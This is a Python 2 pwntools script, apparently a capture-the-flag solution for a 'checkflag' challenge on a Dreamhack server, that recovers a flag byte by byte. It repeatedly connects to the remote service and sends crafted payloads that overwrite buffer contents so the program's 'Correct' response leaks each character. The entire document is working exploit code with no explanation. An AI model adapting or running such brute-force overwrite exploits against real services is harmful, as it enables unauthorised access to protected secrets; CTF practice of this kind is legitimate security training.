from pwn import *
import string
import time


context.update(log_level='debug')
flag = ''
len_flag = 0x40 - 1
ascii_table = string.letters + string.digits + '!@#$%^&*()_+-={}[]:";\',./<>?'
for x in range(len_flag):
    flag_found = 0
    #for ch in ascii_table:
    for ch in range(0x20, 0x7e+1):
        ch = chr(ch) 
        p = remote('host1.dreamhack.games', 14345)
        #p = process('checkflag')
        #raw_input('debug: ' + str(p.pid))
        brute = ('x'*len_flag)[: -(len(flag) + 1)] + ch + flag + '\x00'
        print hex(len(brute))
        overwrite = brute[:-(len(flag) + 2)]
        print hex(len(overwrite))
        payload = brute + overwrite
        log.info('payload: ' + payload)
        p.recv(9999)
        p.send(payload)
        if p.recvline().find('Correct') != -1:
            print 'Found part of flag : ' + ch
            time.sleep(2)
            flag = ch + flag
            flag_found = 1
            p.close()
            break
        else:
            print 'Failed : ' + ch
            p.close()
        raw_input('press any key')
    if flag_found == 0:
        break
print 'Flag is : ' + flag


